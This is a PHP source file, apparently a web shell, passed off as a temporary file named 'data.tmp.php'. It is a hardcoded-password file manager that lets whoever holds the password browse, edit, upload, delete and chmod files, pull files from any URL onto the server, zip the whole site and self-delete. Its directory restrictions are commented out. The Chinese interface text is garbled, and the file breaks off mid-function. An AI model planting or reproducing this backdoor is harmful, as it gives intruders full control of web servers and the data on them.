<?php
header('Content-Type: text/html; charset=GB2312');
$adminfile = $SCRIPT_NAME;
$tbcolor1 = "#bacaee";
$tbcolor2 = "#daeaff";
$tbcolor3 = "#7080dd";
$bgcolor1 = "#ffffff";
$bgcolor2 = "#a6a6a6";
$bgcolor3 = "#003399";
$txtcolor1 = "#000000";
$txtcolor2 = "#003399";
$filefolder = "./";
$sitetitle = 'data.tmp.php';
$user = 'admin';
$pass = 'snail';
$meurl = $_SERVER['PHP_SELF'];
$me = end(explode('/',$meurl));


$op = $_REQUEST['op'];
$folder = $_REQUEST['folder'];
//while (preg_match('/\.\.\//',$folder)) $folder = preg_replace('/\.\.\//','/',$folder);
//while (preg_match('/\/\//',$folder)) $folder = preg_replace('/\/\//','/',$folder);

if ($folder == '') {
  $folder = $filefolder;
} elseif ($filefolder != '') {
  //if (!ereg($filefolder,$folder)) {
  //  $folder = $filefolder;
  //}  
}


/****************************************************************/
/* User identification                                          */
/*                                                              */
/* Looks for cookies. Yum.                                      */
/****************************************************************/

if ($_COOKIE['user'] != $user || $_COOKIE['pass'] != md5($pass)) {
	if ($_REQUEST['user'] == $user && $_REQUEST['pass'] == $pass) {
	    setcookie('user',$user,time()+60*60*24*1);
	    setcookie('pass',md5($pass),time()+60*60*24*1);
	} else {
		if ($_REQUEST['user'] == $user || $_REQUEST['pass']) $er = true;
		login($er);
	}
}



/****************************************************************/
/* function maintop()                                           */
/*                                                              */
/* Controls the style and look of the site.                     */
/* Recieves $title and displayes it in the title and top.       */
/****************************************************************/
function maintop($title,$showtop = true) {
  global $me,$sitetitle, $lastsess, $login, $viewing, $iftop, $bgcolor1, $bgcolor2, $bgcolor3, $txtcolor1, $txtcolor2, $user, $pass, $password, $debug, $issuper;
  echo "<html>\n<head>\n"
      ."<title>$sitetitle :: $title</title>\n"
      ."</head>\n"
      ."<body bgcolor=\"#ffffff\">\n"
      ."<style>\n"
      ."td { font-size : 80%;font-family : tahoma;color: $txtcolor1;font-weight: 700;}\n"
      ."A:visited {color: \"$txtcolor2\";font-weight: bold;text-decoration: underline;}\n"
      ."A:hover {color: \"$txtcolor1\";font-weight: bold;text-decoration: underline;}\n"
      ."A:link {color: \"$txtcolor2\";font-weight: bold;text-decoration: underline;}\n"
      ."A:active {color: \"$bgcolor2\";font-weight: bold;text-decoration: underline;}\n"
      ."textarea {border: 1px solid $bgcolor3 ;color: black;background-color: white;}\n"
      ."input.button{border: 1px solid $bgcolor3;color: black;background-color: white;}\n"
      ."input.text{border: 1px solid $bgcolor3;color: black;background-color: white;}\n"
      ."BODY {color: $txtcolor1; FONT-SIZE: 10pt; FONT-FAMILY: Tahoma, Verdana, Arial, Helvetica, sans-serif; scrollbar-base-color: $bgcolor2; MARGIN: 0px 0px 10px; BACKGROUND-COLOR: $bgcolor1}\n"
      .".title {FONT-WEIGHT: bold; FONT-SIZE: 10pt; COLOR: #000000; TEXT-ALIGN: center; FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif}\n"
      .".copyright {FONT-SIZE: 8pt; COLOR: #000000; TEXT-ALIGN: left}\n"
      .".error {FONT-SIZE: 10pt; COLOR: #AA2222; TEXT-ALIGN: left}\n"
      ."</style>\n\n";

  if ($viewing == "") {
    echo "<table cellpadding=10 cellspacing=10 bgcolor=$bgcolor1 align=center><tr><td>\n"
        ."<table cellpadding=1 cellspacing=1 bgcolor=$bgcolor2><tr><td>\n"
        ."<table cellpadding=5 cellspacing=5 bgcolor=$bgcolor1><tr><td>\n";
  } else {
    echo "<table cellpadding=7 cellspacing=7 bgcolor=$bgcolor1><tr><td>\n";
  }

  echo "<table width=\"100%\" border=\"0\" cellpadding=\"2\" cellspacing=\"0\">\n"
      ."<tr><td align=\"left\"><font face=\"Arial\" color=\"black\" size=\"4\">$sitetitle</font><font size=\"3\" color=\"black\"> :: $title</font></td>\n"
      ."<tr><td width=650 style=\"height: 1px;\" bgcolor=\"black\"></td></tr>\n";

  if ($showtop) {
    echo "<tr><td><font size=\"2\">\n"
        ."<a href=\"".$adminfile."?op=home\" $iftop>��ҳ</a>\n"
        ."<img src=pixel.gif width=7 height=1><a href=\"".$adminfile."?op=up\" $iftop>�ϴ�</a>\n"
        ."<img src=pixel.gif width=7 height=1><a href=\"".$adminfile."?op=cr\" $iftop>����</a>\n"
        ."<img src=pixel.gif width=7 height=1><a href=\"".$adminfile."?op=allz\" $iftop>ȫվ����</a>\n"
        ."<img src=pixel.gif width=7 height=1><a href=\"".$adminfile."?op=sqlb\" $iftop>���ݿⱸ��</a>\n"
        ."<img src=pixel.gif width=7 height=1><a href=\"".$adminfile."?op=ftpa\" $iftop>FTP����</a>\n"
        ."<img src=pixel.gif width=7 height=1><a href=\"".$adminfile."?op=killme&dename=".$me."&folder=./\">��ɱ</a>\n"
        ."<img src=pixel.gif width=7 height=1><a href=\"".$adminfile."?op=logout\" $iftop>�˳�</a>\n";

    echo "<tr><td width=650 style=\"height: 1px;\" bgcolor=\"black\"></td></tr>\n";
  }
  echo "</table><br>\n";
}


/****************************************************************/
/* function login()                                             */
/*                                                              */
/* Sets the cookies and alows user to log in.                   */
/* Recieves $pass as the user entered password.                 */
/****************************************************************/
function login($er=false) {
  global $op;
    setcookie("user","",time()-60*60*24*1);
    setcookie("pass","",time()-60*60*24*1);

	echo "<div style='height:999px'></div><script>window.onload=document.body.style.overflow='hidden'</script>";

    maintop("��¼",false);

    if ($er) { 
		echo "<font class=error>**����: ����ȷ�ĵ�¼��Ϣ.**</font><br><br>\n"; 
	}

    echo "<form action=\"".$adminfile."?op=".$op."\" method=\"post\">\n"
        ."<table><tr>\n"
        ."<td><font size=\"2\">�û���: </font>"
        ."<td><input type=\"text\" name=\"user\" size=\"18\" border=\"0\" class=\"text\" value=\"$user\">\n"
        ."<tr><td><font size=\"2\">����: </font>\n"
        ."<td><input type=\"password\" name=\"pass\" size=\"18\" border=\"0\" class=\"text\" value=\"$pass\">\n"
        ."<tr><td colspan=\"2\"><input type=\"submit\" name=\"submitButtonName\" value=\"��¼\" border=\"0\" class=\"button\">\n"
        ."</table>\n"
        ."</form>\n";
  mainbottom();

}


/****************************************************************/
/* function home()                                              */
/*                                                              */
/* Main function that displays contents of folders.             */
/****************************************************************/
function home() {
  global $folder, $tbcolor1, $tbcolor2, $tbcolor3, $filefolder, $HTTP_HOST;
  maintop("��ҳ");
  echo "<font face=\"tahoma\" size=\"2\"><b>\n"
      ."<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\" width=100%>\n";

  $content1 = "";
  $content2 = "";

  $count = "0";
  $style = opendir($folder);
  
  
  $a=1;
  $b=1;

  if ($folder) {
    if (ereg("/home/",$folder)) {
      $folderx = ereg_replace("$filefolder", "", $folder);
      $folderx = "http://".$HTTP_HOST."/".$folderx;
    } else {
      $folderx = $folder;
    } 
  }

  while($stylesheet = readdir($style)) {
    if (strlen($stylesheet)>40) { 
      $sstylesheet = substr($stylesheet,0,40)."...";
    } else {
      $sstylesheet = $stylesheet;
    }
    if ($stylesheet[0] != "." && $stylesheet[0] != ".." ) {
      if (is_dir($folder.$stylesheet) && is_readable($folder.$stylesheet)) { 
        $content1[$a] ="<td>".$sstylesheet."</td>\n"
                 ."<td> "
                 //.disk_total_space($folder.$stylesheet)." Commented out due to certain problems
                 ."<td align=\"left\"><img src=pixel.gif width=5 height=1>".substr(sprintf('%o',fileperms($folder.$stylesheet)), -4)
                 ."<td align=\"center\"><a href=\"".$adminfile."?op=home&folder=".$folder.$stylesheet."/\">��</a>\n"
                 ."<td align=\"center\"><a href=\"".$adminfile."?op=ren&file=".$stylesheet."&folder=$folder\">������</a>\n"
                 ."<td align=\"center\"><a href=\"".$adminfile."?op=z&dename=".$stylesheet."&folder=$folder\">ѹ��</a>\n"
                 ."<td align=\"center\"><a href=\"".$adminfile."?op=del&dename=".$stylesheet."&folder=$folder\">ɾ��</a>\n"
                 ."<td align=\"center\"><a href=\"".$adminfile."?op=mov&file=".$stylesheet."&folder=$folder\">�ƶ�</a>\n"
                 ."<td align=\"center\"><a href=\"".$adminfile."?op=chm&file=".$stylesheet."&folder=$folder\">����</a>\n"
                 ."<td align=\"center\"> <tr height=\"2\"><td height=\"2\" colspan=\"3\">\n";
        $a++;
      } elseif (!is_dir($folder.$stylesheet) && is_readable($folder.$stylesheet)) { 
        $content2[$b] ="<td><a href=\"".$folderx.$stylesheet."\">".$sstylesheet."</a></td>\n"
                 ."<td align=\"left\"><img src=pixel.gif width=5 height=1>".filesize($folder.$stylesheet)
                 ."<td align=\"left\"><img src=pixel.gif width=5 height=1>".substr(sprintf('%o',fileperms($folder.$stylesheet)), -4)
                 ."<td align=\"center\"><a href=\"".$adminfile."?op=edit&fename=".$stylesheet."&folder=$folder\">�༭</a>\n"
                 ."<td align=\"center\"><a href=\"".$adminfile."?op=ren&file=".$stylesheet."&folder=$folder\">������</a>\n"
                 ."<td align=\"center\"><a href=\"".$adminfile."?op=unz&dename=".$stylesheet."&folder=$folder\">��ѹ</a>\n"
                 ."<td align=\"center\"><a href=\"".$adminfile."?op=del&dename=".$stylesheet."&folder=$folder\">ɾ��</a>\n"
                 ."<td align=\"center\"><a href=\"".$adminfile."?op=mov&file=".$stylesheet."&folder=$folder\">�ƶ�</a>\n"
                 ."<td align=\"center\"><a href=\"".$adminfile."?op=chm&file=".$stylesheet."&folder=$folder\">����</a>\n"
                 ."<td align=\"center\"><a href=\"".$adminfile."?op=viewframe&file=".$stylesheet."&folder=$folder\">�鿴</a>\n"
                 ."<tr height=\"2\"><td height=\"2\" colspan=\"3\">\n";
        $b++;
      } else {
        echo "Directory is unreadable\n";
      }
    $count++;
    } 
  }
  closedir($style);

  echo "���Ŀ¼: $folder\n"
       ."<br>�ļ���: " . $count . "<br><br>";

  echo "<tr bgcolor=\"$tbcolor3\" width=100%>"
      ."<td width=220>����\n"
      ."<td width=65>��С\n"
      ."<td width=35>Ȩ��\n"
      ."<td align=\"center\" width=44>��\n"
      ."<td align=\"center\" width=58>������\n"
      ."<td align=\"center\" width=45>ѹ��\n"
      ."<td align=\"center\" width=45>ɾ��\n"
      ."<td align=\"center\" width=45>�ƶ�\n"
      ."<td align=\"center\" width=45>Ȩ��\n"
      ."<td align=\"center\" width=45>�鿴\n"
      ."<tr height=\"2\"><td height=\"2\" colspan=\"3\">\n";

  for ($a=1; $a<count($content1)+1;$a++) {
    $tcoloring   = ($a % 2) ? $tbcolor1 : $tbcolor2;
    echo "<tr bgcolor=".$tcoloring." width=100%>";
    echo $content1[$a];
  }

  for ($b=1; $b<count($content2)+1;$b++) {
    $tcoloring   = ($a++ % 2) ? $tbcolor1 : $tbcolor2;
    echo "<tr bgcolor=".$tcoloring." width=100%>";
    echo $content2[$b];
  }

  echo"</table>";
  mainbottom();
}


/****************************************************************/
/* function up()                                                */
/*                                                              */
/* First step to Upload.                                        */
/* User enters a file and the submits it to upload()            */
/****************************************************************/

function up() {
  global $folder, $content, $filefolder;
  maintop("�ϴ�");

  echo "<FORM ENCTYPE=\"multipart/form-data\" ACTION=\"".$adminfile."?op=upload\" METHOD=\"POST\">\n"
      ."<font face=\"tahoma\" size=\"2\"><b>�����ϴ� <br>�ļ�:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;�ϴ�Ŀ¼:</b></font><br><input type=\"File\" name=\"upfile\" size=\"20\" class=\"text\">\n"
      ."&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<select name=\"ndir\" size=1>\n"
      ."<option value=\"".$filefolder."\">".$filefolder."</option>";
  listdir($filefolder);
  echo $content
      ."</select><br>"
      ."<input type=\"submit\" value=\"�ϴ�\" class=\"button\">\n"
      ."</form>\n";
  echo "Զ���ϴ���ʲô��˼��<br>Զ���ϴ��Ǵ�������������ȡ�ļ���ֱ�����ص���ǰ��������һ�ֹ��ܡ�<br>������SSH��Wget���ܣ���ȥ�����������ֶ��ϴ����˷ѵ�ʱ�䡣<br><br>Զ�����ص�ַ:<form action=\"".$adminfile."?op=yupload\" method=\"POST\"><input name=\"url\" size=\"80\" /><input name=\"submit\" value=\"�ϴ�\" type=\"submit\" /></form>\n"
    ."����Ϊ�������ص�ַ�������ֶ����ƣ�"
    ."<br>Wordpress��http://tool.gidc.me/file/wordpress.zip"
    ."<br>Typecho��http://tool.gidc.me/file/typecho.zip"
    ."<br>EMBlog��http://tool.gidc.me/file/emblog.zip<br><br>";
  mainbottom();
}

/****************************************************************/
/* function yupload()                                           */
/*                                                              */
/* Second step in wget file.                                    */
/* Saves the file to the disk.                                  */
/* Recieves $upfile from up() as the uploaded file.             */
/****************************************************************/

function yupload($url, $folder = "./") {
set_time_limit (24 * 60 * 60); // ���ó�ʱʱ��
$destination_folder = $folder . './'; // �ļ����ر���Ŀ¼��Ĭ��Ϊ��ǰ�ļ�Ŀ¼
if (!is_dir($destination_folder)) { // �ж�Ŀ¼�Ƿ����
mkdirs($destination_folder); // ���û�оͽ���Ŀ¼
}
$newfname = $destination_folder . basename($url); // ȡ���ļ�������
$file = fopen ($url, "rb"); // Զ�������ļ���������ģʽ
if ($file) { // ������سɹ�
$newf = fopen ($newfname, "wb"); // Զ���ļ��ļ�
if ($newf) // ����ļ�����ɹ�
while (!feof($file)) { // �жϸ���д���Ƿ�����
fwrite($newf, fread($file, 1024 * 8), 1024 * 8); // û��д��ͼ���
}
}
if ($file) {
fclose($file); // �ر�Զ���ļ�
}
if ($newf) {
fclose($newf); // �رձ����ļ�
}
maintop("Զ���ϴ�");
echo "�ļ� ".$url." �ϴ��ɹ�.\n"
    ."&nbsp;<a href=\"".$adminfile."?op=home\">�����ļ�����</a>\n";
mainbottom();
return true;
}

/****************************************************************/
/* function upload()                                            */
/*                                                              */
/* Second step in upload.                                      */
/* Saves the file to the disk.                                  */
/* Recieves $upfile from up() as the uploaded file.             */
/****************************************************************/
function upload($upfile, $ndir) {

  global $folder;
  if (!$upfile) {
    error("�ļ�̫�� �� �ļ���С����0");
  } elseif($upfile['name']) { 
    if(copy($upfile['tmp_name'],$ndir.$upfile['name'])) { 
      maintop("�ϴ�");
      echo "�ļ� ".$upfile['name'].$folder.$upfile_name." �ϴ��ɹ�.\n";
      mainbottom();
    } else {
      printerror("�ļ� $upfile �ϴ�ʧ��.");
    }
  } else {
    printerror("�������ļ���.");
  }
}

/****************************************************************/
/* function allz()                                               */
/*                                                              */
/* First step in allzip.                                        */
/* Prompts the user for confirmation.                           */
/* Recieves $dename and ask for deletion confirmation.          */
/****************************************************************/
function allz() {
    maintop("ȫվ����");
    echo "<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\">\n"
        ."<font class=error>**����: �⽫����ȫվ�����allbackup.zip�Ķ���! ����ڸ��ļ������ļ���������!**</font><br><br>\n"
        ."ȷ��Ҫ����ȫվ���?<br><br>\n"
        ."<a href=\"".$adminfile."?op=allzip\">ȷ��</a> | \n"
        ."<a href=\"".$adminfile."?op=home\"> ȡ�� </a>\n"
        ."</table>\n";
    mainbottom();
}

/****************************************************************/
/* function allzip()                                            */
/*                                                              */
/* Second step in unzip.                                       */
/****************************************************************/
function allzip() {
maintop("ȫվ����");
if (file_exists('allbackup.zip')) {
unlink('allbackup.zip'); }
else {
}
class Zipper extends ZipArchive {
public function addDir($path) {
print 'adding ' . $path . '<br>';
$this->addEmptyDir($path);
$nodes = glob($path . '/*');
foreach ($nodes as $node) {
print $node . '<br>';
if (is_dir($node)) {
$this->addDir($node);
} else if (is_file($node))  {
$this->addFile($node);
}
}
} 
}
$zip = new Zipper;
$res = $zip->open('allbackup.zip', ZipArchive::CREATE);
if ($res === TRUE) {
$zip->addDir('.');
$zip->close();
echo 'ȫվѹ����ɣ�'
    ."&nbsp;<a href=\"".$adminfile."?op=home\">�����ļ�����</a>\n";
} else {
echo 'ȫվѹ��ʧ�ܣ�'
    ."&nbsp;<a href=\"".$adminfile."?op=home\">�����ļ�����</a>\n";
}
    mainbottom();
}

/****************************************************************/
/* function unz()                                               */
/*                                                              */
/* First step in unz.                                        */
/* Prompts the user for confirmation.                           */
/* Recieves $dename and ask for deletion confirmation.          */
/****************************************************************/
function unz($dename) {
  global $folder;
    if (!$dename == "") {
    maintop("��ѹ");
    echo "<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\">\n"
        ."<font class=error>**����: �⽫��ѹ ".$folder.$dename." ��$folder. **</font><br><br>\n"
        ."ȷ��Ҫ��ѹ ".$folder.$dename."?<br><br>\n"
        ."<a href=\"".$adminfile."?op=unzip&dename=".$dename."&folder=$folder\">ȷ��</a> | \n"
        ."<a href=\"".$adminfile."?op=home\"> ȡ�� </a>\n"
        ."</table>\n";
    mainbottom();
  } else {
    home();
  }
}


/****************************************************************/
/* function unzip()                                            */
/*                                                              */
/* Second step in unzip.                                       */
/****************************************************************/
function unzip($dename) {
  global $folder;
  if (!$dename == "") {
    maintop("��ѹ");
 $zip = new ZipArchive();
if ($zip->open($folder.$dename) === TRUE) {
    $zip->extractTo('./'.$folder);
    $zip->close();
    echo $dename." �Ѿ�����ѹ."
    ."&nbsp;<a href=\"".$adminfile."?op=home\">�����ļ�����</a>\n";
} else {
    echo '�޷���ѹ�ļ�.'
    ."&nbsp;<a href=\"".$adminfile."?op=home\">�����ļ�����</a>\n";
}
    mainbottom();
  } else {
    home();
}
}


/****************************************************************/
/* function del()                                               */
/*                                                              */
/* First step in delete.                                        */
/* Prompts the user for confirmation.                           */
/* Recieves $dename and ask for deletion confirmation.          */
/****************************************************************/
function del($dename) {
  global $folder;
    if (!$dename == "") {
    maintop("ɾ��");
    echo "<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\">\n"
        ."<font class=error>**����: �⽫����ɾ�� ".$folder.$dename.". ��������ǲ��ɻ�ԭ��.**</font><br><br>\n"
        ."ȷ��Ҫɾ�� ".$folder.$dename."?<br><br>\n"
        ."<a href=\"".$adminfile."?op=delete&dename=".$dename."&folder=$folder\">ȷ��</a> | \n"
        ."<a href=\"".$adminfile."?op=home\"> ȡ�� </a>\n"
        ."</table>\n";
    mainbottom();
  } else {
    home();
  }
}


/****************************************************************/
/* function delete()                                            */
/*                                                              */
/* Second step in delete.                                       */
/* Deletes the actual file from disk.                           */
/* Recieves $upfile from up() as the uploaded file.             */
/****************************************************************/
function deltree($pathdir)  
{  
if(is_empty_dir($pathdir))//����ǿյ�  
   {  
   rmdir($pathdir);//ֱ��ɾ��  
   }  
   else  
   {//��������Ŀ¼������.��..��  
       $d=dir($pathdir);  
       while($a=$d->read())  
       {  
       if(is_file($pathdir.'/'.$a) && ($a!='.') && ($a!='..')){unlink($pathdir.'/'.$a);}  
       //������ļ���ֱ��ɾ��  
       if(is_dir($pathdir.'/'.$a) && ($a!='.') && ($a!='..'))  
       {//�����Ŀ¼  
           if(!is_empty_dir($pathdir.'/'.$a))//�Ƿ�Ϊ��  
           {//������ǣ���������������ԭ����·��+���¼���Ŀ¼��  
           deltree($pathdir.'/'.$a);  
           }  
           if(is_empty_dir($pathdir.'/'.$a))  
           {//����ǿվ�ֱ��ɾ��  
           rmdir($pathdir.'/'.$a);
           }
       }  
       }  
       $d->close();  
   }  
}  
function is_empty_dir($pathdir)  
{ 
//�ж�Ŀ¼�Ƿ�Ϊ�� 
$d=opendir($pathdir);  
$i=0;  
   while($a=readdir($d))  
   {  
   $i++;  
   }  
closedir($d);  
if($i>2){return false;}  
else return true;  
}

function delete($dename) {
  global $folder;
  if (!$dename == "") {
    maintop("ɾ��");
    if (is_dir($folder.$dename)) {
      if(is_empty_dir($folder.$dename)){ 
      rmdir($folder.$dename);
      echo $dename." �Ѿ���ɾ��."
    ."&nbsp;<a href=\"".$adminfile."?op=home\">�����ļ�����</a>\n";
    } else {
      deltree($folder.$dename);
      rmdir($folder.$dename);
      echo $dename." �Ѿ���ɾ��."
    ."&nbsp;<a href=\"".$adminfile."?op=home\">�����ļ�����</a>\n";
      }
    } else {
      if(unlink($folder.$dename)) {
        echo $dename." �Ѿ���ɾ��."
    ."&nbsp;<a href=\"".$adminfile."?op=home\">�����ļ�����</a>\n";
      } else {
        echo "�޷�ɾ���ļ�. "
    ."&nbsp;<a href=\"".$adminfile."?op=home\">�����ļ�����</a>\n";
      }
    }
    mainbottom();
  } else {
    home();
  }
}


/****************************************************************/
/* function edit()                                              */
/*                                                              */
/* First step in edit.                                          */
/* Reads the file from disk and displays it to be edited.       */
/* Recieves $upfile from up() as the uploaded file.             */
/****************************************************************/
function edit($fename) {
  global $folder;
  if (!$fename == "") {
    maintop("�༭");
    echo $folder.$fename;

    echo "<form action=\"".$adminfile."?op=save\" method=\"post\">\n"
        ."<textarea cols=\"73\" rows=\"40\" name=\"ncontent\">\n";

   $handle = fopen ($folder.$fename, "r");
   $contents = "";

    while ($x<1) {
      $data = @fread ($handle, filesize ($folder.$fename));
      if (strlen($data) == 0) {
        break;
      }
      $contents .= $data;
    }
    fclose ($handle);

    $replace1 = "</text";
    $replace2 = "area>";
    $replace3 = "< / text";
    $replace4 = "area>";
    $replacea = $replace1.$replace2;
    $replaceb = $replace3.$replace4;
    $contents = ereg_replace ($replacea,$replaceb,$contents);

    echo $contents;

    echo "</textarea>\n"
        ."<br><br>\n"
        ."<input type=\"hidden\" name=\"folder\" value=\"".$folder."\">\n"
        ."<input type=\"hidden\" name=\"fename\" value=\"".$fename."\">\n"
        ."<input type=\"submit\" value=\"����\" class=\"button\">\n"
        ."</form>\n";
    mainbottom();
  } else {
    home();
  }
}


/****************************************************************/
/* function save()                                              */
/*                                                              */
/* Second step in edit.                                         */
/* Recieves $ncontent from edit() as the file content.          */
/* Recieves $fename from edit() as the file name to modify.     */
/****************************************************************/
function save($ncontent, $fename) {
  global $folder;
  if (!$fename == "") {
    maintop("�༭");
    $loc = $folder.$fename;
    $fp = fopen($loc, "w");

    $replace1 = "</text";
    $replace2 = "area>";
    $replace3 = "< / text";
    $replace4 = "area>";
    $replacea = $replace1.$replace2;
    $replaceb = $replace3.$replace4;
    $ncontent = ereg_replace ($replaceb,$replacea,$ncontent);

    $ydata = stripslashes($ncontent);

    if(fwrite($fp, $ydata)) {
      echo "�ļ� <a href=\"".$adminfile."?op=viewframe&file=".$fename."&folder=".$folder."\">".$folder.$fename."</a> ����ɹ���\n"
    ."&nbsp;<a href=\"".$adminfile."?op=home\">�����ļ�����</a>\n";
      $fp = null;
    } else {
      echo "�ļ��������\n"
    ."&nbsp;<a href=\"".$adminfile."?op=home\">�����ļ�����</a>\n";
    }
    mainbottom();
  } else {
    home();
  }
}


/****************************************************************/
/* function cr()                                                */
/*                                                              */
/* First step in create.                                        */
/* Promts the user to a filename and file/directory switch.     */
/****************************************************************/
function cr() {
  global $folder, $content, $filefolder;
  maintop("����");
  if (!$content == "") { echo "<br><br>������һ������.\n"; }
  echo "<form action=\"".$adminfile."?op=create\" method=\"post\">\n"
      ."�ļ���: <br><input type=\"text\" size=\"20\" name=\"nfname\" class=\"text\"><br><br>\n"
   
      ."Ŀ��:<br><select name=ndir size=1>\n"
      ."<option value=\"".$filefolder."\">".$filefolder."</option>";
  listdir($filefolder);
  echo $content
      ."</select><br><br>";


  echo "�ļ� <input type=\"radio\" size=\"20\" name=\"isfolder\" value=\"0\" checked><br>\n"
      ."Ŀ¼ <input type=\"radio\" size=\"20\" name=\"isfolder\" value=\"1\"><br><br>\n"
      ."<input type=\"hidden\" name=\"folder\" value=\"$folder\">\n"
      ."<input type=\"submit\" value=\"����\" class=\"button\">\n"
      ."</form>\n";
  mainbottom();
}


/****************************************************************/
/* function create()                                            */
/*                                                              */
/* Second step in create.                                       */
/* Creates the file/directoy on disk.                           */
/* Recieves $nfname from cr() as the filename.                  */
/* Recieves $infolder from cr() to determine file trpe.         */
/****************************************************************/
function create($nfname, $isfolder, $ndir) {
  global $folder;
  if (!$nfname == "") {
    maintop("����");

    if ($isfolder == 1) {
      if(mkdir($ndir."/".$nfname, 0777)) {
        echo "����Ŀ¼<a href=\"".$adminfile."?op=home&folder=./".$nfname."/\">".$ndir."".$nfname."</a> �Ѿ��ɹ�������.\n"
    ."&nbsp;<a href=\"".$adminfile."?op=home\">�����ļ�����</a>\n";
      } else {
        echo "����Ŀ¼".$ndir."".$nfname." ���ܱ�����. ��������Ŀ¼Ȩ���Ƿ��Ѿ�������Ϊ777\n";
      }
    } else {
      if(fopen($ndir."/".$nfname, "w")) {
        echo "�����ļ�, <a href=\"".$adminfile."?op=viewframe&file=".$nfname."&folder=$ndir\">".$ndir.$nfname."</a> �Ѿ��ɹ�������.\n"
    ."&nbsp;<a href=\"".$adminfile."?op=home\">�����ļ�����</a>\n";
      } else {
        echo "�����ļ� ".$ndir."/".$nfname." ���ܱ�����. ��������Ŀ¼Ȩ���Ƿ��Ѿ�������Ϊ777\n";
      }
    }
    mainbottom();
  } else {
    cr();
  }
}

function chm($file) {
  global $folder;
  if (!$file == "") {
    maintop("����Ȩ��");
    echo "<form action=\"".$adminfile."?op=chmodok\" method=\"post\">\n"
        ."<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\">\n"
        ."����Ȩ�� ".$folder.$file;

    echo "</table><br>\n"
        ."<input type=\"hidden\" name=\"rename\" value=\"".$file."\">\n"
        ."<input type=\"hidden\" name=\"folder\" value=\"".$folder."\">\n"
        ."Ȩ��:<br><input class=\"text\" type=\"text\" size=\"20\" name=\"nchmod\">\n"
        ."<input type=\"Submit\" value=\"����\" class=\"button\">\n";
    echo "<br><br>\n"
         ."Ȩ��Ϊ��λ������0777 0755 0644��\n"
         ."<br>\n";
    mainbottom();
  } else {
    home();
  }
}


function chmodok($rename, $nchmod, $folder) {
  global $folder;
  if (!$rename == "") {
    maintop("������");
    $loc1 = "$folder".$rename; 
    $loc2 = octdec($nchmod);

    if(chmod($loc1,"$loc2")) {
      echo "�ļ� ".$folder.$rename." ��Ȩ���Ѿ�����Ϊ".$nchmod."</a>\n"
    ."&nbsp;<a href=\"".$adminfile."?op=home\">�����ļ�����</a>\n";
    } else {
      echo "���ó���\n"
    ."&nbsp;<a href=\"".$adminfile."?op=home\">�����ļ�����</a>\n";
    }
    mainbottom();
  } else {
    home();
  }
}

/****************************************************************/
/* function ren()                                               */
/*                                                              */
/* First step in rename.                                        */
/* Promts the user for new filename.                            */
/* Globals $file and $folder for filename.                      */
/****************************************************************/
function ren($file) {
  global $folder;
  if (!$file == "") {
    maintop("������");
    echo "<form action=\"".$adminfile."?op=rename\" method=\"post\">\n"
        ."<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\">\n"
        ."������ ".$folder.$file;

    echo "</table><br>\n"
        ."<input type=\"hidden\" name=\"rename\" value=\"".$file."\">\n"
        ."<input type=\"hidden\" name=\"folder\" value=\"".$folder."\">\n"
        ."�µ���:<br><input class=\"text\" type=\"text\" size=\"20\" name=\"nrename\">\n"
        ."<input type=\"Submit\" value=\"������\" class=\"button\">\n";
    mainbottom();
  } else {
    home();
  }
}


/****************************************************************/
/* function renam()                                             */
/*                                                              */
/* Second step in rename.                                       */
/* Rename the specified file.                                   */
/* Recieves $rename from ren() as the old  filename.            */
/* Recieves $nrename from ren() as the new filename.            */
/****************************************************************/
function renam($rename, $nrename, $folder) {
  global $folder;
  if (!$rename == "") {
    maintop("������");
    $loc1 = "$folder".$rename; 
    $loc2 = "$folder".$nrename;

    if(rename($loc1,$loc2)) {
      echo "�ļ� ".$folder.$rename." �ĵ����ѱ����ĳ� ".$folder.$nrename."</a>\n"
    ."&nbsp;<a href=\"".$adminfile."?op=home\">�����ļ�����</a>\n";
    } else {
      echo "����������\n"
    ."&nbsp;<a href=\"".$adminfile."?op=home\">�����ļ�����</a>\n";
    }
    mainbottom();
  } else {
    home();
  }
}


/****************************************************************/
/* function listdir()                                           */
/*                                                              */
/* Recursivly lists directories and sub-directories.            */
/* Recieves $dir as the directory to scan through.              */
/****************************************************************/
function listdir($dir, $level_count = 0) {
  global $content;
  echo "<script>alert('".$dir."')</script>";
    if (!@($thisdir = opendir($dir))) { return; }
    while ($item = readdir($thisdir) ) {
      if (is_dir("$dir/$item") && (substr("$item", 0, 1) != '.')) {
        listdir("$dir/$item", $level_count + 1);
      }
    }
    if ($level_count > 0) {
      $dir = ereg_replace("[/][/]", "/", $dir);
      $content .= "<option value=\"".$dir."/\">".$dir."/</option>";
    }
}


/****************************************************************/
/* function mov()                                               */
/*                                                              */
/* First step in move.                                          */
/* Prompts the user for destination path.                       */
/* Recieves $file and sends to move().                          */
/****************************************************************/
function mov($file) {
  global $folder, $content, $filefolder;
  if (!$file == "") {
    maintop("�ƶ�");
    echo "<form action=\"".$adminfile."?op=move\" method=\"post\">\n"
        ."<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\">\n"
        ."�ƶ� ".$folder.$file." ��:\n"
        ."<select name=ndir size=1>\n"
        ."<option value=\"".$filefolder."\">".$filefolder."</option>";
    listdir($filefolder);
    echo $content
        ."</select>"
        ."</table><br><input type=\"hidden\" name=\"file\" value=\"".$file."\">\n"
        ."<input type=\"hidden\" name=\"folder\" value=\"".$folder."\">\n" 
        ."<input type=\"Submit\" value=\"�ƶ�\" class=\"button\">\n";
    mainbottom();
  } else {
    home();
  }
}


/****************************************************************/
/* function move()                                              */
/*                                                              */
/* Second step in move.                                         */
